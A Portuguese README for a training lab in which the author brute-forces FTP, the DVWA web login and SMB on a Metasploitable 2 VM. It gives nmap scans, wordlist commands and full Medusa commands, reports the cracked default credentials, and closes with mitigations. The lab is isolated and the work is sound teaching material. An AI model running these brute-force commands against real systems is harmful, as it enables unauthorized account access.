# projeto_pratico_brute_force

🛡️Este projeto faz parte de um desafio prático da DIO. O objetivo é simular cenários de ataques de força bruta em um ambiente controlado para entender vulnerabilidades em serviços comuns e propor medidas de segurança.
---

## 🚀Tecnologias e Ferramentas
*Kali Linux: Sistema operacional para testes de invasão. (versão 2026.1)

*Metasploitable 2: Máquina virtual propositalmente vulnerável (Alvo). (Last Update: 2019-08-19)

*Oracle VM VirtualBox: Gerenciador de virtualização.

*Nmap: Ferramenta de varredura e reconhecimento de rede.

*Medusa: Ferramenta de força bruta (brute-force) modular e paralela.

---

## 🛠️Configuração do Ambiente
1. Rede Virtual
As VMs foram configuradas em modo Host-only (Placa de Rede Exclusiva de Hospedeiro) para garantir que os testes de segurança ficassem isolados da rede externa, evitando riscos.

2. Solução de Problemas (Troubleshooting)
Durante a montagem, a VM Metasploitable apresentou falhas de boot e tela preta.

Problema: O disco .vmdk estava associado a uma controladora SATA.

Solução: Removi a controladora SATA e adicionei o disco a uma Controladora IDE, garantindo a compatibilidade com o kernel do sistema legado.

---

## 🔍Desenvolvimento do Projeto
Reconhecimento de Rede:
Utilizei o nmap para identificar o IP do alvo e os serviços ativos:

=========================================
nmap -v -sn 192.168.56.100-200 | grep 192 
=========================================

Três resultados foram encontrados:

192.168.56.100: Por padrão no VirtualBox, o IP final .100 é reservado para o Servidor DHCP interno, portanto, não nos interessa.

192.168.56.101: O IP .101 é o nosso alvo Metasploitable, confirmado no próprio terminal do mesmo.

192.168.56.102: IP do próprio Kali linux, também não nos interessa. 

---

Com o IP identificado (192.168.56.101), verifiquei os serviços abertos:

Porta 21: FTP

Porta 80: HTTP (DVWA)

Porta 445: SMB

usando o código:

-----------------------------------------------
nmap -sV -p 21, 22, 80, 445, 139 192.168.56.101
------------------------------------------------

Todas as três portas estavam abertas e vulneráveis a ataques.

---

## 🎯Ataque de Força Bruta (FTP) 
Para iniciar o ataque, defini duas wordlists para testes de usuários e senhas comuns para logins 

Para usuários:

-------------------------------------------------
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
-------------------------------------------------

Para senhas:

-----------------------------------------------
echo -e "123456\npassword\nmsfadmin" > pass.txt  
-----------------------------------------------

Com essas wordlists definidas, podemos realizar o ataque a porta FTP vulnerável utilizando o medusa: 

------------------------------------------------------------
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 6
------------------------------------------------------------

Com os testes realizados pelo medusa, temos sucesso com a tentativa User: msfadmin  |  Password: msfadmin

e com:

------------------
ftp 192.168.56.101
------------------

Utilizando User e Senha que achamos, temos sucesso no login ao FTP

---

## 🩹Medidas de Segurança para o FTP

1.Desativar o Acesso Anônimo: Garante que apenas usuários autenticados tenham acesso.

2.Política de Senhas Fortes: Implementar requisitos de complexidade para evitar que wordlists simples tenham sucesso.

3.Limitação de Tentativas de Login: Configurar o serviço para desconectar o usuário após 3 ou 5 tentativas falhas.

---

## 🌐Ataque de Força Bruta (Web - DVWA)
Utilizei o Medusa para automatizar tentativas de login no formulário web do DVWA.
O serviço utiliza um sistema simples de login, pede um usuário e uma senha, quando não certificada, o sistema mostra login failed.
Da mesma forma que no FTP, criaremos duas wordlists para uso do brute force.

Para usuários:
-------------------------------------------------
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
-------------------------------------------------

Para senhas:
-------------------------------------------------------
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt  
-------------------------------------------------------

E com o medusa, realizamos o atque ao DVWA:

-----------------------------------------------------------
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE: '/dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
-----------------------------------------------------------

O ataque é realizado com sucesso, o User:user e a senha Password:password são encontradas com sucesso dando acesso ao DVWA

---

## 🩹Medidas de Segurança para o WEB-DVWA

1.Políticas de Senhas: Exigir senhas complexas e trocas periódicas.

2.Bloqueio de IP (Fail2Ban): Implementar ferramentas que bloqueiam automaticamente IPs após X tentativas de login falhas.

3.Uso de MFA: Implementar autenticação de dois fatores em todos os formulários web.

---

## ⛓️‍💥Ataque de Força Bruta (SMB)

O Metasploitable utiliza o SMBv1, uma versão extremamente antiga e insegura que não possui criptografia e é vulnerável a diversos exploits.
Vamos novamente criar wordlists para Brute Force:

Para usuários:
-------------------------------------------------
echo -e "user\nmsfadmin\nservice" > smb_users.txt
-------------------------------------------------

Para senhas:
-------------------------------------------------------------------
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
-------------------------------------------------------------------

Com o medusa, realizamos o ataque ao SMB:
---------------------------------------------------------------------------------
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
---------------------------------------------------------------------------------

Realizando o ataque, obtivemos o User: msfadmin | Password: msfadmin

Para confirmar o ataque, tentamos logar no SMB com:

-----------------------------------------
smbclient -L //192.168.56.101 -U msfadmin
-----------------------------------------

acessando o SMB, temos acesso aos arquivos, podendo realizar Downloads e Uploads dos mesmos.

---

## 🩹Medidas de Segurança para o SMB

1.Desativar o SMBv1: Forçar o uso de versões mais seguras (SMBv2 ou SMBv3), que possuem criptografia nativa.

2.Habilitar SMB Signing: Exigir assinatura digital em todos os pacotes para evitar ataques de Man-in-the-Middle.

3.Bloqueio de Conta (Account Lockout): Implementar políticas que bloqueiam o usuário após sucessivas tentativas falhas de login.

---

## 📝 Resumo

Este projeto consolidou o ciclo completo de uma auditoria de segurança, iniciando pela infraestrutura com a resolução de conflitos de hardware virtual entre controladoras SATA e IDE. Através do Nmap, foi possível mapear a rede e diferenciar ativos reais de serviços auxiliares, enquanto a prática com o Medusa demonstrou a mecânica de ataques de força bruta e a importância da precisão técnica em protocolos como HTTP, FTP e SMB. O trabalho foi concluído com a análise defensiva, evidenciando que a mitigação eficaz depende da desativação de serviços obsoletos, implementação de bloqueios automáticos (Fail2Ban) e adoção de criptografia, resultando em um portfólio que une resolução de problemas técnicos à documentação estruturada de segurança.

---

## 👨‍💻 Autor

Projeto desenvolvido por Igor Bravim Azeredo
